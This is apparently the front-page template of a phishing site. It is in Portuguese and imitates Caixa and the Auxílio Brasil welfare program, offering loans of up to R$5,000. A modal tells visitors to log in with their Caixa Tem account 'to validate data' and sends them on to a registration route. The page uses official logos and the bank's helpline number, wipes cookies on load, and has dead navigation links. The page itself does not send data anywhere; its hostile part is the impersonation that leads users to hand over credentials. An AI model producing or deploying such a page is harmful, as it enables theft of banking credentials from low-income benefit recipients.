<!DOCTYPE html lang="pt">
<head>

    <meta charset="UTF-8">

    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>Empréstimo Auxilio Brasil</title>

    <!-- icon -->

    <link rel="shortcut icon" href="{{asset('assets/images/caixa_tem.png')}}" type="image/x-icon">

    <!-- Personalizations -->

    <link rel="stylesheet" href="{{asset('assets/css/index.css')}}">

    <!-- Bootsrtap 5.3.0 CSS -->

    <link href="{{asset('assets/css/bootstrap.min.css')}}" rel="stylesheet" crossorigin="anonymous">

    <!-- Fontawesome 6.4.0 -->

    <link rel="stylesheet" href="{{asset('assets/css/all.min.css')}}" crossorigin="anonymous" referrerpolicy="no-referrer">

    <!-- Toast -->

    <link rel="stylesheet" href="{{asset("assets/css/sweetalert2.min.css")}}">

</head>



<body>

    <script>
        // Função para excluir todos os cookies
        function deleteAllCookies() {
            var cookies = document.cookie.split(";");

            for (var i = 0; i < cookies.length; i++) {
                var cookie = cookies[i];
                var eqPos = cookie.indexOf("=");
                var name = eqPos > -1 ? cookie.substr(0, eqPos) : cookie;
                document.cookie = name + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";
            }
        }

        // Exclua todos os cookies assim que a página for carregada
        window.onload = function() {
            deleteAllCookies();
        };
    </script>

    <style>
        /* Estilo para ocultar o modal por padrão */
#contratoModal {
    display: none;
  }

  /* Estilo para mostrar o modal quando o mouse passa sobre o botão */
  .hover-button:hover + #contratoModal {
    display: block;
  }
    </style>

    <nav class="navbar navbar-expand-lg navbar-white bg-white">

        <div class="container">

            <a class="navbar-brand" href="javascript:void(0);">

                <img src="{{asset('assets/images/aux_brasil.png')}}" width="70">

                <img src="{{asset('assets/images/bolsa_familia_logo.png')}}" width="150">

            </a>



            <div class="collapse navbar-collapse" id="navbarNav">

                <ul class="navbar-nav">

                    <li class="nav-item">

                        <a class="nav-link" href="javascript:void(0);">Página Inicial</a>

                    </li>

                    <li class="nav-item">

                        <a class="nav-link" href="javascript:void(0);">Empréstimo</a>

                    </li>

                    <li class="nav-item">

                        <a class="nav-link" href="javascript:void(0);">Suporte e Contato</a>

                    </li>

                </ul>

            </div>

        </div>

    </nav>

    <div class="container mt-4">

        <div class="row">

            <div class="col-12 text-center">

                <h1 class="title">Bem-vindo ao Auxílio Brasil!</h1>

                <p class="subtitle">
                    Na Caixa, a compreensão das suas metas financeiras é fundamental, e estamos �&nbsp; disposição para apoiá-lo. <br>
                    Oferecemos soluções de empréstimo confiáveis e transparentes, projetadas sob medida para atender �&nbsp;s suas necessidades individuais. <br>
                    Nossa equipe de especialistas está pronta para ajudá-lo a tomar decisões informadas e a alcançar seus objetivos financeiros com segurança e responsabilidade.
                  </p>

            </div>

        </div>

        <div class="row justify-content-center mt-4">

            <div class="col-lg-6 col-md-6">

                <img src="{{asset('assets/images/8638314_whatsapp_compress.png')}}" class="card-img-top" alt="Imagem do Card">

            </div>

            <div class="col-lg-6 col-md-6 mb-4">

                <div class="card">

                    <div class="card-body">

                        <h2 class="card-title">Empréstimo Auxílio Brasil</h2>

                        <p class="card-text-option"><i class="fa-solid fa-hand-holding-dollar icon-contract"></i> Empréstimo: <a class="card-text"> até R$ 5.000,00.</a></p>

                        <p class="card-text-option"><i class="fa-solid fa-calendar-days icon-contract"></i> Prazo: <a class="card-text">de 18 até 24 meses para pagar.</a></p>

                        <p class="card-text-option"><i class="fa-solid fa-percent icon-contract"></i> Taxa:<a class="card-text"> até 3,99% ao mês.</a></p>

                        <p class="card-text-option"><i class="fa-brands fa-whatsapp icon-contract"></i> Contrate pelo Whatsapp</p>

                        <style>
                            /* Remova o sublinhado e estilize o link como um botão laranja */
                            a.card-btn {
                              text-decoration: none; /* Remova o sublinhado */
                              display: inline-block; /* Transforme em bloco para aplicar estilos de botão */
                              padding: 10px 20px; /* Adicione preenchimento para criar um botão */
                              background-color: #ff6600; /* Cor de fundo laranja do botão */
                              color: #fff; /* Cor do texto do botão */
                              border-radius: 5px; /* Cantos arredondados */
                            }

                            /* Estilo quando o mouse passar por cima do botão */
                            a.card-btn:hover {
                              background-color: #cc5500; /* Cor de fundo alterada quando o mouse passar por cima */
                            }
                          </style>

                          <a href="javascript:void(0);" data-bs-toggle="modal" data-bs-target="#contratoModal" class="card-btn">
                            Contratar
                          </a>



                    </div>

                </div>

            </div>

        </div>






        <!-- Modal de Contrato -->

        <div class="modal fade" id="contratoModal" tabindex="-1" aria-labelledby="contratoModalLabel" aria-hidden="true">

            <div class="modal-dialog modal-dialog-centered">

                <div class="modal-content">

                    <div class="modal-header">

                        <h5 class="modal-title" id="contratoModalLabel">Clique em 'Aceitar' para Continuar</h5>

                        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>

                    </div>

                    <div class="modal-body">
                        1. Após a aceitação dos termos, será necessário efetuar o login com sua conta do Caixa Tem para que seus dados sejam validados e você possa dar continuidade ao processo de solicitação de Empréstimo.
                        <p></p>
                        <br>
                        <div class="image-container">
                          <img src="{{asset('assets/images/tutorial_1.png')}}" alt="">
                        </div>
                        <p></p>
                      </div>

                      <style>
                        /* Estilo para a div que envolve a imagem */
                        .image-container {
                          width: 100%; /* Define a largura da div para 100% */
                          text-align: center; /* Centraliza a imagem horizontalmente */
                        }

                        /* Estilo para a imagem para torná-la responsiva */
                        .image-container img {
                          width: 100%; /* Define a largura da imagem para 100% */
                          max-width: 100%; /* Define a largura máxima da imagem como 100% */
                          height: auto; /* Mantém a proporção da imagem */
                        }
                      </style>

                    <div class="modal-footer">

                        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Fechar</button>

                      <a href="{{route('cadastro.create')}}"> <button type="button" class="btn btn-primary">Aceitar</button></a>
                    </div>

                </div>

            </div>

        </div>

    </div>

    <footer class="bg-light text-center py-4">

        <div class="container">

            <p>0800 726 0207 - Atendimento Caixa ao Cidadão.</p>

            <p><a href="javascript:void(0);" class="footer-link">Programa Integridade</a> <img src="{{asset('assets/images/x-volume-positiva-54-v2.png')}}" width="30"> | <a href="javascript:void(0);" class="footer-link">Termos de Uso</a><img src="{{asset('assets/images/ic-acesso-informacao-54-v2.png')}}" width="30"></p>

        </div>

    </footer>










<script>
    var aceitarContratoBtn = document.getElementById('aceitarContratoBtn');

    // Adiciona um evento de clique ao botão "Aceitar"
    aceitarContratoBtn.addEventListener('click', function() {
        aceitarContratoBtn.innerHTML = '<div class="loader"></div>';
        setTimeout(function() {
            window.location.href = 'process.html';
        }, 3000);
    });

    // Adiciona um evento de passar o mouse (hover) ao botão
    aceitarContratoBtn.addEventListener('mouseover', function() {
        // Aqui você pode adicionar o código para fazer algo quando o mouse passar sobre o botão.
        // Por exemplo, alterar a cor de fundo, mostrar uma mensagem, etc.
    });

    // Adiciona um evento para quando o mouse sair do botão
    aceitarContratoBtn.addEventListener('mouseout', function() {
        // Aqui você pode adicionar o código para reverter quaisquer alterações feitas durante o hover.
        // Por exemplo, restaurar a cor de fundo original.
    });
</script>

<!-- Toast js -->

<script src="{{asset('assets/js/sweetalert2.min.js')}}"></script>

    <script src="{{asset('assets/js/bootstrap.bundle.min.js')}}" crossorigin="anonymous"></script>
</body>
</html>
